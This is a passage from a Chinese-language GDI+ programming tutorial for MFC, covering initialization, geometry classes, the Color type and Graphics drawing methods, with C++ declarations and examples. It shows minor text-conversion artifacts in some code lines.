<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ULONG_PTR m_gdiplusToken; // ULONG PTR &#20026; int64 &#31867;&#22411; &#24182;&#22312;&#35813;&#31867;&#30340;&#21021;&#22987;&#21270;&#20989;&#25968; CGdipApp::InitInstance()&#20013;&#21152;&#20837;&#20197;&#19979;&#20195;&#30721;&#26469;&#23545; GDI+&#36827;&#34892;&#21021;&#22987;&#21270;&#65306;&#10;GdiplusStartupInput gdiplusStartupInput; &#10;GdiplusStartup(&#38;m_gdiplusToken, &#38;gdiplusStartupInput, NULL);</span><br></pre></td></tr></table></figure>
<p>注意：这两个语句必须加在应用程序类的 InitInstance 函数中的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CWinApp::InitInstance();</span><br></pre></td></tr></table></figure>
<p>语句之前，不然以后会造成视图窗口不能自动重画、程序中不能使用字体等等一系列问题。</p>
<p>还要在 CGdipApp::ExitInstance()中加入以下代码来关闭 GDI+：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GdiplusShutdown(m_gdiplusToken);</span><br></pre></td></tr></table></figure>
<p>上面的 InitInstance 和 ExitInstance 都是应用程序类的重写型方法。而且，默认时 VC08 SP1 及其以前版本是不会自动生成 ExitInstance 方法代码的（不过 VC10 会自动生成此方法），需 要自己利用属性窗口来添加（不要手工添加）。</p>
<p>（3）绘图</p>
<p>接下来就可以利用 GDI+进行绘图了。下面的代码段是在 OnDraw 函数中画一个带网格 的透明度连续变化的图：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CGdipView::OnDraw(CDC* pDC) &#123;&#10;    &#8230;&#8230;&#10;    Graphics graph(pDC-&#38;gt;m_hDC); // &#21019;&#24314;&#22270;&#24418;&#23545;&#35937;&#10;    Pen bluePen(Color(0, 0, 255)); // &#21019;&#24314;&#34013;&#33394;&#31508;&#10;    Pen redPen(Color(255, 0, 0)); // &#21019;&#24314;&#32418;&#33394;&#31508;&#10;    int y = 255; // y &#30340;&#21021;&#20540;&#10;    for (int x = 0; x &#38;lt; 256; x += 5) &#123; // &#32472;&#21046;&#32418;&#34013;&#32593;&#32447;&#10;        graph.DrawLine(&#38;bluePen, 0, y, x, 0);&#10;        graph.DrawLine(&#38;redPen, 255, x, y, 255);&#10;        y -= 5;&#10;    &#125;&#10;    // &#30011;&#19968;&#32452;&#32511;&#33394;&#36879;&#26126;&#24230;&#22402;&#30452;&#28176;&#21464;&#30340;&#27700;&#24179;&#32447;&#65288;&#22635;&#28385;&#27491;&#26041;&#24418;&#65289;&#10;    for (y = 0; y &#38;lt; 256; y++) &#123;&#10;        Pen pen(Color(y, 0, 255, 0)); // &#945; &#38543; y &#21464;&#30340;&#32511;&#33394;&#31508;&#10;    graph.DrawLine(&#38;pen, 0, y, 255, y);&#10;    &#125;&#10;    // &#30011;&#19968;&#32452;&#21697;&#32418;&#33394;&#36879;&#26126;&#24230;&#27700;&#24179;&#28176;&#21464;&#30340;&#22402;&#30452;&#32447;&#65288;&#22635;&#28385;&#25153;&#30697;&#24418;&#65289;&#10;    for (int x = 0; x &#38;lt; 256; x++) &#123;&#10;        Pen pen(Color(x, 255, 0, 255)); // &#945; &#38543; x &#21464;&#30340;&#21697;&#32418;&#33394;&#31508;&#10;        graph.DrawLine(&#38;pen, x, 100, x, 200);&#10;    &#125;&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>运行的结果如图 14-11 所示。其中，左图为第一个循环所绘制的结果、中图为前两个循 环所绘制的结果、右图为全部三个循环所绘制的结果。</p>
<p><img src="../img/gdip-编程基础/Image_017.jpg" alt="image"></p>
<p><img src="../img/gdip-编程基础/Image_018.jpg" alt="image"></p>
<p><img src="../img/gdip-编程基础/Image_019.jpg" alt="image"></p>
<p>图 14-11 透明度的连续变化</p>
<h3 id="1-3-3_new_问题">1.3.3 new 问题</h3><p>在 VC08（包括 SP1）中使用 GDI+时，不能用 new 来动态创建 GDI+对象。解决办法有 如下两种：</p>
<p>（1）修改 GdiplusBase 类</p>
<p>打开（默认）位于“C:\Program Files\Microsoft SDKs\Windows\v6.0A\ Include\”目录中 的 Gdiplus Base.h 头文件，并注释掉里面 Gdiplus Base 类的内容（该类其实只含 new、new[]、 delete 和 delete[]这四个运算符的重载），使其成为一个空类（但不要删除整个类）。</p>
<p>为了不修改原始安装目录中的 Gdiplus Base.h 头文件，可以：</p>
<ul>
<li><p>将该头文件复制到你的项目目录中。</p>
</li>
<li><p>注释掉该头文件里面 Gdiplus Base 类的内容（保留类定义）。</p>
</li>
<li><p>在项目中所有的#include <gdiplus.h>语句之前，包含”Gdiplus Base.h”头文件，形如：</gdiplus.h></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include &#34;gdiplusBase.h&#34;&#10;#include &#38;lt;gdiplus.h&#38;gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>则编译系统会优先包含项目目录中的 gdiplus Base.h 头文件，从而屏蔽掉原来位于 平台 SDK 的 Include 目录中的同名头文件。</p>
</li>
</ul>
<p>（2）用&amp;代替 new</p>
<p>也可以在有些使用 new 的地方改用&amp;，例如将代码 Pen <em>pPen = <strong>new</strong> Pen(Color::Red); 改 为 Pen </em>pPen = <strong>&amp;</strong>Pen(Color::Red);。</p>
<h2 id="1-4_几何辅助类">1.4 几何辅助类</h2><p>与 GDI 的类似，在 GDI+ API 中也定义了许多绘图的辅助类，常用的有点、大小和矩形 等几何类。它们都是没有基类的独立类，被定义在头文件 GdiplusTypes.h 中。与 GDI 不同 的是，在 GDI+中新增加了浮点型的几何类。</p>
<p>浮点数版的几何对象和绘图方法，是 GDI+新增的功能，这些在各种工程技术领域都非 常有用。因为一般的实际图形设计，都是基于实数坐标的。包括机械（../轮船/飞机 等）、建筑（../道路/堤坝等）和图形动画设计（../../轨迹等）等设 计，都必须使用浮点参数和坐标系。</p>
<p>下面对 GDI+的几何辅助类，逐个进行简单的介绍。</p>
<h3 id="1-4-1_Point[F]（点）">1.4.1 Point[F]（点）</h3><p>GDI+中，有两种类型的点：整数点（对应于 Point 类，与 GDI 的 MFC 类 CPoint 类似） 和浮点数点（对应于 PointF 类），下面分别加以介绍。</p>
<p>（1）整数点类 Point</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class Point &#10;&#123; &#10;public:&#10;    Point() &#123;X = Y = 0;&#125;&#10;    Point(const Point &#38;point) &#123;X = point.X; Y = point.Y;&#125; &#10;    Point(const Size &#38;size) &#123;X = size.Width; Y = size. Height;&#125; &#10;    Point(INT x, INT y) &#123;X = x; Y = y;&#125;&#10;    Point operator+(const Point&#38; point) const &#123;return Point(X + point.X, Y + point.Y);&#125;&#10;    Point operator-(const Point&#38; point) const &#123;return Point(X - point.X, Y - point.Y);&#125; &#10;    BOOL Equals(const Point&#38; point) &#123;return (X == point.X) &#38;&#38; (Y == point.Y);&#125;&#10;public:&#10;    INT X; INT Y; // &#22823;&#20889; X&#12289;Y&#10;&#125;;</span><br></pre></td></tr></table></figure>
<p>其中：typedef int INT; 为 4 字节有符号整数（windef.h）。 注意，GDI+的点与 GDI 的区别：POINT 和 CPoint 采用小写的 x、y。</p>
<p>（2）浮点数点类 PointF</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class PointF &#10;&#123; &#10;public:&#10;    PointF() &#123;X = Y = 0.0f;&#125;&#10;    PointF(REAL x, REAL y) &#123;X = x; Y = y;&#125;&#10;    ... // &#19982;&#25972;&#25968;&#29256;&#30340;&#31867;&#20284;&#10;public:&#10;    REAL X; REAL Y;&#10;&#125;;</span><br></pre></td></tr></table></figure>
<p>其中：typedef float REAL; 为 4 字节浮点数（GdiplusTypes.h）。</p>
<h3 id="1-4-2_Size[F]（大小）">1.4.2 Size[F]（大小）</h3><p>GDI+中，也有两种类型的大小（尺寸）：整数大小（对应于 Size 类，与 GDI 的 MFC 类 CSize 类似）和浮点数大小（对应于 SizeF 类）。下面分别加以介绍：</p>
<p>（1）整数大小类 Size：</p>
<p>class Size<br>{<br>public:<br>    Size() {Width = Height = 0;}<br>    Size(INT width, INT height) {Width = width; Height = height;}<br>    …<br>public:<br>    INT Width;<br>    INT Height; // 宽和高，不再是 cx 和 cy<br>};</p>
<p>注意，这里的大小与 GDI 的区别：SIZE 和 CSize 的分量成员为 cx 和 cy，不是宽和高。</p>
<p>（2）浮点数大小类 SizeF：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class SizeF &#10;&#123; &#10;public:&#10;    SizeF() &#123;Width = Height = 0.0f;&#125;&#10;    SizeF(REAL width, REAL height) &#123;Width = width; Height = height;&#125;&#10;    ...&#10;public:&#10;    REAL Width; REAL Height;&#10;&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="1-4-3_Rect[F]（矩形）">1.4.3 Rect[F]（矩形）</h3><p>GDI+中，也有两种类型的矩形：整数矩形（对应于 Rect 类，与 GDI 的 MFC 类 CRect 类似）和浮点数矩形（对应于 RectF 类），下面分别加以介绍。</p>
<p>（1）整数矩形类 Rect：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class Rect &#10;&#123; &#10;public:&#10;    Rect() &#123;X = Y = Width = Height = 0;&#125;&#10;    Rect(INT x, INT y, INT width, INT height);&#10;    ...&#10;    INT GetLeft() const &#123;return X;&#125; INT GetTop() const &#123;return Y;&#125;&#10;    INT GetRight() const &#123;return X+Width;&#125; INT GetBottom() const &#123;return Y+Height;&#125;&#10;    BOOL IsEmptyArea() const&#123;return (Width &#38;lt;= 0) || (Height &#38;lt;= 0);&#125; BOOL Equals(const Rect &#38; rect) const;&#10;    BOOL Contains(INT x, INT y) const; BOOL **Contains**(const Point&#38; pt) const; BOOL Contains(Rect&#38; rect) const;&#10;    ...&#10;    VOID Offset(const Point&#38; point); VOID Offset(INT dx, INT dy);&#10;public:&#10;    INT X; INT Y; // &#22823;&#20889;&#30340; X &#21644; Y&#65288;&#20026;&#30697;&#24418;&#24038;&#19978;&#35282;&#30340;&#22352;&#26631;&#65289;&#65292;&#19981;&#20877;&#26159; left &#21644; top &#10;    INT Width; &#10;    INT Height; // &#23485;&#21644;&#39640;&#65292;&#19981;&#20877;&#26159; right &#21644; bottom&#10;&#125;;</span><br></pre></td></tr></table></figure>
<p>注意，这里的矩形与 GDI 的区别：RECT 和 CRect 的分量成员是左、顶、右、底而不 是 X、Y、宽、高。虽然 Rect 中的(X, Y)等价于 RECT 的(left, top)，但是 Rect 中的(Width, Height) 却不同于 RECT 的(right, bottom)。</p>
<p>（2）浮点数矩形类 RectF：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class RectF &#10;&#123; &#10;public:&#10;    RectF() &#123;X = Y = Width = Height = 0.0f;&#125;&#10;    RectF(REAL x, REAL y, REAL width, REAL height);&#10;    ...&#10;public:&#10;    REAL X; &#10;    REAL Y;&#10;    REAL Width; &#10;    REAL Height;&#10;&#125;;</span><br></pre></td></tr></table></figure>
<p>在 GDI 的 MFC 封装中，除了定义有点、大小和矩形的类外，还保留了对应的 API 结构 POINT、SIZE 和 RECT，主要是考虑运行效率及与底层 GDI API 的兼容。</p>
<p>比较可知，GDI 和 GDI+都有对应的几何类，不过 GDI+没有对应的结构（但有新增加 的浮点数版类），而 GDI 则没有对应的浮点数版类（但却有对应的结构）。</p>
<h2 id="1-5_颜色">1.5 颜色</h2><p>与 GDI 相比，GDI+的颜色新增了一个透明分量，并且定义了颜色类 Color。</p>
<h3 id="1-5-1_颜色类型_ARGB">1.5.1 颜色类型 ARGB</h3><p>GDI+中的颜色，与 GDI 中的颜色的最大不同，是增加了一个字节（8 位）的透明分量 alpha（α ），用来表示颜色的不透明度：0 透明（看不见前景色，只有背景色）~255 不透明（看不见背景色，只有前景色，相当于覆盖和拷贝）。背景色指屏幕窗口中原有图形的颜色， 前景色指将要绘制图形的颜色。</p>
<p>因此，GDI+中的颜色一般都是用四个字节表示（Intel CPU 中，多字节整数的低位在前）：</p>
<ul>
<li><p>整数序（高位→低位）：</p>
<p><img src="../img/gdip-编程基础/1-5-1-1.png" alt=""></p>
</li>
<li><p>字节序（低字节→高字节）：</p>
<p><img src="../img/gdip-编程基础/1-5-1-2.png" alt=""></p>
</li>
</ul>
<p>在 GDI 中没有专门的颜色类，只有一个颜色类型 COLORREF，也定义为： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef DWORD COLORREF; // 0x00bbggrr (windef.h)</span><br></pre></td></tr></table></figure>
<p>和一个生成颜色的宏：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COLORREF RGB( BYT E bRed, BYTE bGreen, BYT E bBlue);</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef unsigned char BYTE; // &#21333;&#23383;&#33410;&#26080;&#31526;&#21495;&#23383;&#31526;&#25972;&#25968;</span><br></pre></td></tr></table></figure>
<p>在 GDI+中，也将颜色数据定义为无符号 4 字节长整数类型 DWORD，但是改名为 ARGB： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef DWORD ARGB; // gdipluspixelformats.h</span><br></pre></td></tr></table></figure>
<h3 id="1-5-2_颜色类_Color">1.5.2 颜色类 Color</h3><p>而且 GDI+中还定义了专门的 Color 类，不仅包含了此颜色数据，而且还有多个构造函 数和其他辅助方法、枚举和常量。</p>
<p>Color 类的构造函数中，最常用的是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Color( BYTE a, BYTE r, BYT E g, BYTE b); // a &#20026; alpha &#20998;&#37327;&#945; &#20294;&#20063;&#26377;&#19968;&#20010;&#40664;&#35748;&#26500;&#36896;&#20989;&#25968;&#65306;&#10;Color( VOID); // &#19981;&#36879;&#26126;&#40657;&#33394;&#65292;&#30456;&#24403;&#20110; Color(255, 0, 0, 0);</span><br></pre></td></tr></table></figure>
<p>还有一个与 GDI 兼容的构造函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Color( BYTE r, BYTE g, BYTE b); // &#19981;&#36879;&#26126;&#33394;&#65292;&#30456;&#24403;&#20110; Color(255, r, g, b);</span><br></pre></td></tr></table></figure>
<p>你也可以直接用含颜色数据的 4 字节无符号整数，来构造 Color 类的对象：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Color( ARGB argb); // &#30456;&#24403;&#20110; Color(a, r, g, b);</span><br></pre></td></tr></table></figure>
<p>该整数可以由 Color 类的静态方法 MakeARGB 或动态方法 GetValue 获得：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">static ARGB MakeARGB( BYT E a, BYTE r, BYTE g, BYTE b);&#10;ARGB GetValue(VOID);</span><br></pre></td></tr></table></figure>
<p>你还也可以用 Color 类的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COLORREF ToCOLORREF() const;</span><br></pre></td></tr></table></figure>
<p>将 Color 对象中的颜色，转换为 GDI 的颜色类型。</p>
<p>Color 类还提供了各个颜色分量的获取方法及其简化版：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BYTE GetAlpha() const; &#10;BYTE GetA() const; &#10;BYTE GetRed() const; &#10;BYTE GetR() const; &#10;BYTE GetGreen() const; &#10;BYTE GetG() const; &#10;BYTE GetBlue() const; &#10;BYTE GetB() const;</span><br></pre></td></tr></table></figure>
<p>你也可以先用宏：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BYTE GetRValue(DWORD rgb); // COLORREF rgb &#10;BYTE GetGValue(DWORD rgb); // COLORREF rgb &#10;BYTE GetBValue(DWORD rgb); // COLORREF rgb</span><br></pre></td></tr></table></figure>
<p>获取 COLORREF 的 R、G、B 值，然后再用这些值调用 Color 类的构造函数来创建 Color 对象。例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COLORREF crCol = colDlg.GetColor(); &#10;BYTE r = GetRValue(crCol),&#10;     g = GetGValue(crCol), &#10;     b = GetBValue(crCol);&#10;Color col(r, g, b); // Color col(crCol | (255&#60;&#60;24));</span><br></pre></td></tr></table></figure>
<h3 id="1-5-3_颜色枚举常量">1.5.3 颜色枚举常量</h3><p>GDI+在颜色头文件 GdiplusColor.h 中，定义了 141 个公用颜色枚举常量，都是对应颜色 的英文单词。可以用 Color 类直接访问，例如：Color ::Red。</p>
<p>下面是部分颜色枚举常量（按字母顺序排列）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public:&#10;    // Common color constants &#36890;&#29992;&#39068;&#33394;&#24120;&#37327;&#10;    enum &#123;&#10;        AliceBlue = 0xFFF0F8FF, // &#33406;&#20029;&#19997;&#34013;&#10;        AntiqueWhite = 0xFFFAEBD7, // &#21476;&#33891;&#30333;&#10;        Aqua = 0xFF00FFFF, // &#27700;&#32511;&#10;        Aquamarine = 0xFF7FFFD4, // &#30887;&#32511;&#10;        Azure = 0xFFF0FFFF, // &#22825;&#34013;&#10;        Beige = 0xFFF5F5DC, // &#31859;&#33394;&#10;        Bisque = 0xFFFFE4C4, // &#27748;&#40644;&#10;        Black = 0xFF000000, // &#40657;&#10;        BlanchedAlmond = 0xFFFFEBCD, // &#24067;&#20848;&#22855;&#26447;&#40644;&#10;        Blue = 0xFF0000FF, // &#34013;&#10;        BlueViolet = 0xFF8A2BE2, // &#34013;&#32043;&#10;        Brown = 0xFFA52A2A, // &#26837;&#35088;&#10;        ...&#10;        Tan = 0xFFD2B48C, // &#33590;&#33394;&#10;        Teal = 0xFF008080, // &#27700;&#40493;&#38738;&#10;        Thistle = 0xFFD8BFD8, // &#34015;&#33394;&#10;        Tomato = 0xFFFF6347, // &#30058;&#33540;&#32418;&#10;        Transparent = 0x00FFFFFF, // &#36879;&#26126;&#10;        Turquoise = 0xFF40E0D0, // &#23453;&#30707;&#32511;&#10;        Violet = 0xFFEE82EE, // &#32043;&#32599;&#20848;&#10;        Wheat = 0xFFF5DEB3, // &#23567;&#40614;&#33394;&#10;        White = 0xFFFFFFFF, // &#30333;&#10;        WhiteSmoke = 0xFFF5F5F5, // &#28895;&#30333;&#10;        Yellow = 0xFFFFFF00, // &#40644;&#10;        YellowGreen = 0xFF9ACD32 // &#40644;&#32511;&#10;    &#125;;</span><br></pre></td></tr></table></figure>
<p>图 14-12 是各种颜色枚举字符常量（包括中文译名）所对应的色块表（按字母顺序排列）。</p>
<h2 id="1-6_图形类_Graphics">1.6 图形类 Graphics</h2><p>与 GDI 的 MFC 类 CDC 类似，GDI+的绘图功能主要由图形类 Graphics 承担。</p>
<p>图形类 Graphics 是 GDI+的核心，它提供绘制图形、图像和文本的各种方法（似 GDI 中的 CDC 类），还可以存储显示设备和被画项目的属性（到图元文件）。Graphics 类及其方 法都被定义在头文件 Gdiplusgraphics.h 中。</p>
<p><img src="../img/gdip-编程基础/Image_020.jpg" alt="image"></p>
<p><img src="../img/gdip-编程基础/Image_021.jpg" alt="image"></p>
<p>图 14-12 颜色枚举常量</p>
<h3 id="1-6-1_构造函数">1.6.1 构造函数</h3><p>Graphics 类的构造函数有如下 4 种：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics(Image* image); // &#29992;&#20110;&#32472;&#21046;&#22270;&#20687;&#10;Graphics(HDC hdc); // &#29992;&#20110;&#22312;&#24403;&#21069;&#31383;&#21475;&#20013;&#32472;&#22270;&#10;Graphics(HDC hdc, HANDLE hdevice); // &#29992;&#20110;&#22312;&#21046;&#23450;&#35774;&#22791;&#19978;&#32472;&#21046;&#22270;&#24418;&#10;Graphics(HWND hwnd, BOOL icm = FALSE); // &#29992;&#20110;&#22312;&#25351;&#23450;&#31383;&#21475;&#20013;&#32472;&#22270;</span><br></pre></td></tr></table></figure>
<p>其中，最常用的是第二种——在当前视图窗口中绘图的图形类构造函数。</p>
<p>注意，该构造函数的输入参数，是设备上下文的句柄，而不是 CDC 类对象的指针。一 般可以由 CDC 对象得到（因 CDC 类含有公用数据成员 HDC m_hDC;）：</p>
<ul>
<li><p>在 OnDraw 函数中，利用输入参数 CDC *pDC，就可直接得到 DC 句柄。例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#38;gt;m_hDC);</span><br></pre></td></tr></table></figure>
</li>
<li><p>在视图类的其他函数中，可先利用 GetDC 函数得到 CDC 指针，然后再利用它去获 取 DC 的句柄。例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(GetDC()-&#38;gt;m_hDC);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>也可以使用 Graphics 类的另一个构造函数 <code>Graphics(HWND hwnd, BOOL icm = FALSE);</code>，利用视图类的窗口句柄成员来构造 Graphics 对象。例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(this-&#38;gt;m_hWnd);</span><br></pre></td></tr></table></figure>
<h3 id="1-6-2_状态枚举_status">1.6.2 状态枚举 status</h3><p>在图形类 Graphics 中，封装了各种绘图方法。每种绘图方法被调用后，都会返回一种 叫做 status 的枚举值，反映该方法是否被正确执行，0 表示正确，其他大于 0 的值为错误代 码（GdiplusTypes.h）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef enum &#123; // &#29366;&#24577;&#26522;&#20030;&#65288;&#21547; 22 &#20010;&#26522;&#20030;&#20540;&#65289;&#10;    Ok = 0,&#10;    GenericError = 1,&#10;    InvalidParameter = 2,&#10;    OutOfMemory = 3,&#10;    ...&#10;    PropertyNotSupported = 20,&#10;    ProfileNotFound = 21&#10;&#125; Status;</span><br></pre></td></tr></table></figure>
<p>GDI+的绘图功能被封装在图形类 Graphics 中，下面介绍其中的常用绘图方法。先讲绘 制线型图的方法，再讲绘制填充图的方法，最后讲绘制文字的方法。</p>
<h3 id="1-6-3_画线型图的方法">1.6.3 画线型图的方法</h3><p>GDI+中绘制线型图形的方法与 GDI 的类似，也包括绘直线、矩形、椭圆和多边形等， 但是 GDI+增加了浮点版本和若干新功能。GDI+的画线函数都是 Graphics 类的方法，而且所 有方法的名称都是以 Draw 开头。</p>
<p>（1）画直线[折线]DrawLine[s]</p>
<p>在 GDI+中定义了 6 种绘制直线和折线的方法，前三个为整数版，后三个为对应的浮点 数版：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status DrawLine(const Pen* pen, INT x1, INT y1, INT x2, INT y2);&#10;Status DrawLine(const Pen* pen, const Point&#38; pt1, const Point&#38; pt2); &#10;Status DrawLines(const Pen* pen, const Point* points, INT count);&#10;Status DrawLine(const Pen* pen, REAL x1, REAL y1, REAL x2, REAL y2);&#10;Status DrawLine(const Pen* pen, const PointF&#38; pt1, const PointF&#38; pt2); &#10;Status DrawLines(const Pen* pen, const PointF* points, INT count);</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<ul>
<li><p>DrawLine——画直线（4 个重载），参数 pen 为画直线所用的笔、(x1, y1)和 pt1 为 直线的起点、(x2, y2)和 pt2 为直线的终点。GDI 的相应函数为 MoveTo 和 LineTo。</p>
</li>
<li><p>DrawLines——画折线（一串相互连接的直线段）（2 个重载），参数 points 为点数 组、count 为数组中点的数目。GDI 的相应函数为 Polyline。</p>
</li>
</ul>
<p>（2）画矩形[组] DrawRectangle[s]</p>
<p>在 GDI+中也定义了 6 种绘制矩形和矩形组的方法，也是前三个为整数版，后三个为对 应的浮点数版：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status DrawRectangle(const Pen* pen, const Rect&#38; rect);&#10;Status DrawRectangle(const Pen* pen, INT x, INT y, INT width, INT height); &#10;Status DrawRectangles(const Pen* pen, const Rect* rects, INT count);&#10;Status DrawRectangle(const Pen* pen, const RectF&#38; rect);&#10;Status DrawRectangle(const Pen* pen, REAL x, REAL y, REAL width, REAL height); &#10;Status DrawRectangles(const Pen* pen, const RectF* rects, INT count);</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<ul>
<li><p>DrawRectangle——画单个矩形（4 个重载），参数 pen 为画矩形所用的笔、rect 为 矩形区域、(x, y)为矩形的左上角、(width, height)为矩形的大小（宽，高）。与 GDI 的对应函数 BOOL Rectangle( int x1, int y1, int x2, int y2);的区别主要是 GDI+的第 2 个和第 4 个画矩形方法的后两个输入参数，不再是 GDI 中的矩形右下角的坐标， 而改成矩形的宽和高了。</p>
</li>
<li><p>DrawRectangles——画多个矩形（2 个重载），参数 rects 为矩形数组、count 为数组 中矩形的数目。GDI 中没有同时绘制一个矩形数组的函数。</p>
</li>
</ul>
<p>（3）[椭]圆 DrawEllipse</p>
<p>GDI+中有 4 个重载的绘制椭圆的方法，如果输入参数所确定的外接矩形的宽高相等， 则画圆。也是前两个为整数版，后两个为对应的浮点数版：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status DrawEllipse(const Pen* pen, const Rect&#38; rect);&#10;Status DrawEllipse(const Pen* pen, INT x, INT y, INT width, INT height) Status DrawEllipse(const Pen* pen, const RectF&#38; rect);&#10;Status DrawEllipse(const Pen* pen, REAL x, REAL y, REAL width, REAL height);</span><br></pre></td></tr></table></figure>
<p>这些方法的功能，与 GDI 中的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BOOL Ellipse( int x1, int y1, int x2, int y2 );</span><br></pre></td></tr></table></figure>
<p>图 14-13 画弧方法的输入参数</p>
<p>类似，但是同样要注意 GDI+的 DrawEllipse 方法与 GDI 的 Ellipse 函数的主要区别（与画矩 形的方法与函数类似），是上面的以坐标为参数的第 2、4 个 GDI+画椭圆方法的后两个输入 参数，也是矩形的宽高而不再是矩形的右下角坐标了。</p>
<p>（4）画[椭]圆弧 DrawArc</p>
<p>GDI+中也有 4 个重载的绘制椭圆弧的方法，如果输入参数所确定的外接矩形的宽高相 等，则画圆弧。也是前两个为整数版，后两个为对应的浮点数版。</p>
<p><img src="../img/gdip-编程基础/Image_022.jpg" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status DrawArc(const Pen* pen, INT x, INT y, INT width, INT height, REAL startAngle, REAL sweepAngle);&#10;Status DrawArc(const Pen* pen, const Rect&#38; rect, REAL startAngle, REAL sweepAngle);&#10;Status DrawArc(const Pen* pen, REAL x, REAL y, REAL width, REAL height, REAL startAngle, REAL sweepAngle);&#10;Status DrawArc(const Pen* pen, const RectF&#38; rect, REAL startAngle, REAL sweepAngle);</span><br></pre></td></tr></table></figure>
<p>注意，角度的单位是度（不是弧度，C++的三角函数 采用的是弧度单位），而且都必须是实数。零度角为 x 轴 方向，顺时针方向为正（这与数学上反时针方向为正刚好相反），参见图 14-13。</p>
<p>（5）画多边形 DrawPolygon</p>
<p>GDI+中有 2 个重载的绘制多边形的方法，前一个为整数版，后一个为对应的浮点数版：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status DrawPolygon(const Pen* pen, const Point* points, INT count); &#10;Status DrawPolygon(const Pen* pen, const PointF* points, INT count);</span><br></pre></td></tr></table></figure>
<p>其中，各参数的含义同画折线方法 DrawLines 的，只是 DrawPolygon 方法会将点数组中的起点和终点连接起来，形成一个封闭的多边形区域。 该方法的功能与 GDI 的 Polygon 函数相同：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BOOL Polygon( LPPOINT lpPoints, int nCount );</span><br></pre></td></tr></table></figure>
<p>注意：GDI+中没有提供与 GDI 函数 RoundRect（圆角矩形）和 Chord（弓弦）具有类 似功能的绘图方法，但可以利用矩形+椭圆和弧+直线等方法来自己实现。</p>
<h3 id="1-6-4_画填充图的方法">1.6.4 画填充图的方法</h3><p>在 GDI 中，任何画封闭区域的性状图绘制函数（如矩形、圆角矩形、[椭]圆、弓弦和多 边形等），都可以画填充图，因为它们总是在用当前笔画指定边框的同时，也用当前刷子填 充内部区域。</p>
